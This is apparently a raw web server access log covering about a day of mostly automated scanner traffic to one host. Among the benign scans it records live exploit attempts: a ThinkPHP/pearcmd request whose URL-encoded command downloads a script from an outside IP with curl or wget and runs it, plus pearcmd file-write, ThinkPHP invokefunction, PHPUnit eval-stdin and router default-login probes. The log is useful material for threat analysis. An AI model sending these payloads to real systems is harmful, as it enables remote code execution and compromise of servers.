167.94.146.60 - - [15/Feb/2025:15:02:29 +0000] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.60 - - [15/Feb/2025:15:02:29 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
135.148.213.254 - - [15/Feb/2025:15:03:06 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
193.68.89.51 - - [15/Feb/2025:15:12:23 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [15/Feb/2025:15:19:24 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.246.87.21 - - [15/Feb/2025:15:21:42 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [15/Feb/2025:15:22:41 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.10 - - [15/Feb/2025:15:33:17 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
13.64.192.68 - - [15/Feb/2025:15:38:40 +0000] "GET /manager/text/list HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
193.68.89.51 - - [15/Feb/2025:16:08:10 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [15/Feb/2025:16:10:44 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
92.246.87.21 - - [15/Feb/2025:16:45:52 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [15/Feb/2025:17:00:37 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [15/Feb/2025:17:00:54 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [15/Feb/2025:17:09:24 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.10 - - [15/Feb/2025:17:19:13 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:17:36:18 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
20.238.100.89 - - [15/Feb/2025:17:44:41 +0000] "GET / HTTP/1.1" 200 124 "-" "Python/3.11 aiohttp/3.8.4"
92.246.87.21 - - [15/Feb/2025:18:16:52 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.195.140.86 - - [15/Feb/2025:18:27:58 +0000] "GET / HTTP/1.1" 200 124 "-" "python-requests/2.32.3"
35.195.140.86 - - [15/Feb/2025:18:27:58 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
205.210.31.82 - - [15/Feb/2025:18:38:14 +0000] "GET / HTTP/1.1" 200 124 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.68.89.10 - - [15/Feb/2025:18:58:48 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [15/Feb/2025:19:02:21 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
213.32.32.82 - - [15/Feb/2025:19:03:09 +0000] "\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xA3!\xC3\x80~HM\xAF\xA7\x9B/\xAF'^O}\xF4\xE3\x99\x18\xEA\xFC\xAD\xC8=\xA2\x8A\x11?\x139\xA8 A\x8A\xD9cs]k0\xF6\x01\x13\xDF\xACx\x02\xA1\x93\xFF/" 400 157 "-" "-"
213.32.32.80 - - [15/Feb/2025:19:03:12 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
5.135.238.158 - - [15/Feb/2025:19:10:11 +0000] "\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xFD\xA9\x1E\xD9'\xD4\x19\xDF\x9B\xC9/\x1E\x5C\xBB\xDE=\x16;\xAB\xEB\xD1\x88yO\xAA6}\x90\xDAzt\xDE 0\x99\xBA\xE6\xE2I\x1D\xAB#$oq8\xDD\x0C=(;\xF7\xF6q\x13}C0" 400 157 "-" "-"
5.135.238.149 - - [15/Feb/2025:19:10:12 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
193.68.89.51 - - [15/Feb/2025:19:21:25 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
45.156.129.56 - - [15/Feb/2025:19:21:31 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.93.89.118 - - [15/Feb/2025:19:22:29 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:19:22:29 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:19:22:29 +0000] "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=cd%20%2ftmp%20%7c%7c%20cd%20%2fvar%2ftmp%20%7c%7c%20cd%20%2fdev%2fshm%3b%20curl%20-O%20http%3a%2f%2f196.251.115.173%2fsh%20%7c%7c%20wget%20http%3a%2f196.251.115.173%2fsh%3b%20chmod%20%2bx%20sh%3b%20.%2fsh%20thinkphp%3b%20rm%20-rf%20sh HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:19:22:29 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:19:22:29 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
109.205.213.198 - - [15/Feb/2025:19:44:24 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
40.118.208.150 - - [15/Feb/2025:19:44:48 +0000] "GET /hudson HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
147.185.132.54 - - [15/Feb/2025:19:50:36 +0000] "GET / HTTP/1.0" 200 135 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
103.42.201.36 - - [15/Feb/2025:20:09:05 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.201.199.164 - - [15/Feb/2025:20:14:47 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.68.89.51 - - [15/Feb/2025:20:15:41 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.10 - - [15/Feb/2025:20:45:08 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [15/Feb/2025:20:48:45 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [15/Feb/2025:20:53:33 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
92.255.57.58 - - [15/Feb/2025:21:07:17 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.68.89.51 - - [15/Feb/2025:21:20:26 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
92.255.57.58 - - [15/Feb/2025:21:27:23 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.252.155.142 - - [15/Feb/2025:21:41:07 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
5.252.155.142 - - [15/Feb/2025:21:41:07 +0000] "GET /HNAP1/ HTTP/1.1" 404 125 "http://193.93.76.135:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
141.255.166.90 - - [15/Feb/2025:21:41:13 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [15/Feb/2025:22:07:03 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [15/Feb/2025:22:22:16 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
46.105.70.190 - - [15/Feb/2025:22:25:24 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
193.68.89.10 - - [15/Feb/2025:22:31:34 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:22:58:21 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [15/Feb/2025:23:11:57 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [15/Feb/2025:23:49:34 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [15/Feb/2025:23:54:38 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.10 - - [16/Feb/2025:00:04:50 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.26 - - [16/Feb/2025:00:21:23 +0000] "GET login.cgi HTTP/1.1" 400 157 "-" "-"
47.250.138.220 - - [16/Feb/2025:00:28:46 +0000] "GET / HTTP/1.1" 200 146 "-" "curl/7.64.1"
140.206.195.173 - - [16/Feb/2025:00:39:53 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
123.245.84.89 - - [16/Feb/2025:00:40:41 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
120.39.36.62 - - [16/Feb/2025:00:40:42 +0000] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
141.255.166.90 - - [16/Feb/2025:00:44:01 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
141.255.166.90 - - [16/Feb/2025:01:38:22 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
109.205.213.198 - - [16/Feb/2025:01:47:04 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.241.169.176 - - [16/Feb/2025:02:01:03 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03@\x8C5\x06\xBC\xB0m\xF2\x15N\xF4\xC6\xC7\xBA\xCF\xF3\xBD^#\xE6\xD6\xAB@^\x15\x81j\xF9\xB3\xB8\x16\xEC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
192.241.169.176 - - [16/Feb/2025:02:01:03 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEAkhxg\x0C\x0FZ\xB3\x1FL\xC5hN\x0FJ\xD6x\x1F\xF2f\x09\xCF\xCB" 400 157 "-" "-"
192.241.169.176 - - [16/Feb/2025:02:01:03 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.169.176 - - [16/Feb/2025:02:01:03 +0000] "GET /download/powershell/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
192.241.169.176 - - [16/Feb/2025:02:01:03 +0000] "GET /get.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
104.236.75.167 - - [16/Feb/2025:02:01:27 +0000] "\x00\x0E8\xB7H\x5C\x8C\xD2\x91-\xC2\x00\x00\x00\x00\x00" 400 157 "-" "-"
193.68.89.10 - - [16/Feb/2025:02:05:35 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.108.177.50 - - [16/Feb/2025:02:27:48 +0000] "GET / HTTP/1.0" 200 135 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)"
141.255.166.90 - - [16/Feb/2025:02:30:22 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
111.7.106.106 - - [16/Feb/2025:02:38:11 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
111.7.106.107 - - [16/Feb/2025:02:38:12 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
111.7.106.105 - - [16/Feb/2025:02:40:24 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
23.145.40.147 - - [16/Feb/2025:02:40:33 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
23.145.40.147 - - [16/Feb/2025:02:40:34 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
118.121.27.103 - - [16/Feb/2025:02:53:36 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
103.180.212.24 - - [16/Feb/2025:03:07:55 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 157 "-" "-"
193.68.89.51 - - [16/Feb/2025:03:18:53 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [16/Feb/2025:03:19:48 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.10 - - [16/Feb/2025:03:54:07 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [16/Feb/2025:04:03:22 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [16/Feb/2025:04:03:43 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
64.62.197.32 - - [16/Feb/2025:04:06:26 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDE\xCF\x07\xDD\xA53\xA3\xA4\xD0\xA9\xBF\xDA\xC8\x1CA\xB6\x0B\xFAU\x08\x85\x19w3\x0E\xD9{\x9BC\x84'q\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
141.255.166.90 - - [16/Feb/2025:04:52:06 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:05:06:02 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
87.121.84.7 - - [16/Feb/2025:05:28:54 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.10 - - [16/Feb/2025:05:31:17 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
138.68.143.86 - - [16/Feb/2025:05:40:16 +0000] "\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\x02\x11\x06\x0Fge\xDD\xF3\x04\x85\xAA\xD4\x08\xA6xJ\x93n>\x155\xA9\x8B$S%\x17\xC4\xC4\xC3\x7F# <\x9C\xD6\xA0\x83V\x1A\xA0\x9B\xAE\xC0&\xBD\xC0@\x1CAm\x85\x0BW\x9Br},H[\xC6\x88\x83!8\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\x0E\xBA\x88\x89fx\xB9\x87\x9E\xC6*F#," 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x03\x01W\x01\x00\x01S\x03\x03\xCA\xE7\x14\x1Fi\xC5F\x0C\x81\xB8\xC8" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x03\x01I\x01\x00\x01E\x03\x03F\xD0\xDDDF3\x03\x05\x8B\xB1\x17\x08:N#\x10\xC3\x0Fo<\xBB\x17\xD0wM\x84\xBCb\x13W\xF7\xCC \xA4\xEEl\xE7\xD3\x8F9\xB5\xF6\x84\xE6s\x9F\xC0\xC0\x0C#~\x00\xA4^m^O" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x03\x01\x9A\x01\x00\x01\x96\x03\x03\xFA\xBE\xFB4\x9C=\xC1\xE4\xAFeh\xF2\xD0\xE3\xF6\xB3\xBB\x92\xDE2\x95\xB4\xEDX\xFE+\x9EI\xE7\xF7IU \x17\xAC\x06\xAA9q\x8F\xC8\xFD\x07\x1D!\xAA\x8A\xC3\x17\xA8\x92{\xB4\xC8\xDFj7N}\xCD.9\x02\xE2N\x00\x8Czz\xC0\x12\xC0\x13\xC0\x07\xC0'\xCC\x14\xC0/\x13\x01\xC0\x14\x13\x02\xC0(\xCC\xA9\xC00\xC0s\xC0`\xC0r\xC0a\xC0,\xC0v\xC0\xAF\xC0w\xC0\xAD\xCC\xA8\xC0$\x13\x05\xC0" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x02\x01\x9B\x01\x00\x01\x97\x03\x02\xD4B\x80\x92_\xBA\x8B!d\x88\xD9FL" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x01\x01\xA8\x01\x00\x01\xA4\x03\x03Um1\xB7w\xB6\xFA\x81\xEDt\x8CR\xAC\xB9\x03\xFE" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x01\x01\xA8\x01\x00\x01\xA4\x03\x03\x8D\xD6\xE6\x10_\x97\xF0\xEA=\x18x>\xE4SK\xE2\x87v\x8C\x9B\x5C\xD8d\xCB\x04\xE2c\x82Jmq\x82 \x07\xF6\xB7dc$\xABwx\xC9|\x87\x9AR/\xA7\xF1\x16\xB1y\xB7\xF3\xC1y\xBA\xB5\x96\x1C\x85\x18B \x00\x8A\x00\x05\x00\x04\x00\x07\x00\xC0\x00\x84\x00\xBA\x00A\x00\x9D\xC0\xA1\xC0\x9D\x00=\x005\x00\x9C\xC0\xA0\xC0\x9C\x00<\x00/\x00" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x01\x01\x9E\x01\x00\x01\x9A\x03\x03\xBD\xA5\x8F\xD2\xA6\xE1+\x85\xC1u|\x9F\xDFH\x17\xF0Z\x14\xAB\xF8\xE8[\x10:\xC8\x16\xFD\x8A\x97{\xE0] #\xE1\x8D\xA5rM\x84\xC5\x01\x10\xC1Q\xD2\x02\x09\x89\x0F" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:17 +0000] "\x16\x03\x01\x01\xB5\x01\x00\x01\xB1\x03\x03Y\xA8\xF6\xF7\x0C\x1EB\x1B\xFEWNrn\xC3\xB45Iv\x11@/\x8F\xC4\xD7\xAA\x9C3\x9A&\xF0:" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:18 +0000] "\x16\x03\x01\x00\xFA\x01\x00\x00\xF6\x03\x03\x99\xF2\x06vG)" 400 157 "-" "-"
138.68.143.86 - - [16/Feb/2025:05:40:18 +0000] "\x16\x03\x01\x00\xCE\x01\x00\x00\xCA\x03\x03c\xC8\x19B.\x87\x9B}\xC2_q\xA0\x18sZ{\x00\x10C\xA11v\x876\x01\x06$\x98\xDEO\xE6\xD9 \xC9(~D;8\x1A\x1D\x8F\xE8ee\xCC\xDB\xFD\x14\x0C%\x098\xFD\xA0.\xD3`\x81\xD3\xD7\x0EL{g\x00\x06\x13\x01\x13\x02\x13\x03\x01\x00\x00{\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00" 400 157 "-" "-"
141.255.166.90 - - [16/Feb/2025:05:41:10 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:05:49:54 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
147.185.132.234 - - [16/Feb/2025:06:33:01 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03r\x8D\xAE\xF4\x89\xE5\xEC9\xBC\xE9\xABT\xA5\xC4@x\x0B\xCC!s?\xB6~\xA6\xB2\xF7.\x05\xF57\xC8\x9D \x04\xBA\x99\x90\x22\xBBL\x80\xFA\xA8\x05\x10" 400 157 "-" "-"
147.185.132.234 - - [16/Feb/2025:06:33:01 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x11V\x1B\xCE8\xB2\xB9\xB3\xE2\x1F\x1E\xFB!\x5C\xE6\xABk|\xF1\xF4\xF3\xBD\x06\x13\xF0\xC5\xD2\xE4-\xD7hP\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
193.68.89.51 - - [16/Feb/2025:06:48:11 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
2.57.122.234 - - [16/Feb/2025:06:56:06 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 zgrab/0.x"
157.245.212.20 - - [16/Feb/2025:06:57:09 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (compatible)"
157.245.212.20 - - [16/Feb/2025:06:57:10 +0000] "GET /favicon.ico HTTP/1.1" 404 125 "http://193.93.76.135:8080/" "Mozilla/5.0 (compatible)"
193.68.89.10 - - [16/Feb/2025:07:06:25 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:07:23:18 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:07:38:18 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
52.189.75.207 - - [16/Feb/2025:07:56:11 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 zgrab/0.x"
1.41.149.61 - - [16/Feb/2025:08:01:37 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Falkon/3.2.0 Chrome/87.0.4280.144 Safari/537.36"
1.41.149.61 - - [16/Feb/2025:08:01:38 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "http://193.93.76.135:8080/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Falkon/3.2.0 Chrome/87.0.4280.144 Safari/537.36"
117.209.29.137 - - [16/Feb/2025:08:19:58 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 153 "-" "-"
185.93.89.118 - - [16/Feb/2025:08:24:38 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:24:41 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:24:44 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:24:47 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
